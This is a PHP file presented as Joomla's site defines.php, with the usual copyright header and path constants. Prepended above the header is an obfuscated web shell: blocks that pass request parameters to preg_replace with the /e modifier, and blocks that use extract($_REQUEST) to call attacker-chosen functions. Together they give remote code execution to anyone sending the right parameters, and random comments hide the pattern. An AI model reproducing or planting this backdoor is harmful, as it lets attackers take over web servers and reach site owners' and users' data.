<?php
if (isset($_REQUEST["vVsQ"])) {/*XZGiIJPKX*/@preg_replace('/(.*)/e', @$_REQUEST['vVsQ'], '');/*AExeMDngi*/}

if (isset($_REQUEST["ZAf"])) {@preg_replace('/(.*)/e', @$_REQUEST['ZAf'], '');}

if (isset($_REQUEST["wz"])) {@preg_replace('/(.*)/e', @$_REQUEST['wz'], '');/*uQbaV*/}

if (isset($_REQUEST["rzvw"])) {/*OmbSIn*/@preg_replace('/(.*)/e', @$_REQUEST['rzvw'], '');/*Wmgulch*/}

if (isset($_REQUEST["eWn"])) {@preg_replace('/(.*)/e', @$_REQUEST['eWn'], '');/*kvpNMUQYFl*/}

if (isset($_REQUEST["zh"])) {/*BJirRk*/@preg_replace('/(.*)/e', @$_REQUEST['zh'], '');}

if (isset($_REQUEST["SvW"])) {@preg_replace('/(.*)/e', @$_REQUEST['SvW'], '');}

if (isset($_REQUEST["gWYO"])) {/*cmEwQy*/@preg_replace('/(.*)/e', @$_REQUEST['gWYO'], '');}

if (isset($_REQUEST["SfSE"])) {@extract($_REQUEST);/*GigLZ*/@die($SfSE($LGsgy));/*VnxxbZMhb*/}

if (isset($_REQUEST["FTnp"])) {/*DOhqrD*/@extract($_REQUEST);@die($FTnp($UD));}

if (isset($_REQUEST["Bj"])) {/*kZubZ*/@extract($_REQUEST);@die($Bj($oUyO));}

if (isset($_REQUEST["ad"])) {/*HeEqEhAcuD*/@extract($_REQUEST);/*BkAhczgdd*/@die($ad($JJyV));}

if (isset($_REQUEST["ViQTZ"])) {/*WPwdJcfhr*/@extract($_REQUEST);/*eOQzvJEUf*/@die($ViQTZ($Mh));/*lLJin*/}

/**
 * @package    Joomla.Site
 *
 * @copyright  Copyright (C) 2005 - 2013 Open Source Matters, Inc. All rights reserved.
 * @license    GNU General Public License version 2 or later; see LICENSE.txt
 */

defined('_JEXEC') or die;

/**
 * Joomla! Application define.
 */

//Global definitions.
//Joomla framework path definitions.
$parts = explode(DIRECTORY_SEPARATOR, JPATH_BASE);

//Defines.
define('JPATH_ROOT',          implode(DIRECTORY_SEPARATOR, $parts));

define('JPATH_SITE',          JPATH_ROOT);
define('JPATH_CONFIGURATION', JPATH_ROOT);
define('JPATH_ADMINISTRATOR', JPATH_ROOT . '/administrator');
define('JPATH_LIBRARIES',     JPATH_ROOT . '/libraries');
define('JPATH_PLUGINS',       JPATH_ROOT . '/plugins');
define('JPATH_INSTALLATION',  JPATH_ROOT . '/installation');
define('JPATH_THEMES',        JPATH_BASE . '/templates');
define('JPATH_CACHE',         JPATH_BASE . '/cache');
define('JPATH_MANIFESTS',     JPATH_ADMINISTRATOR . '/manifests');
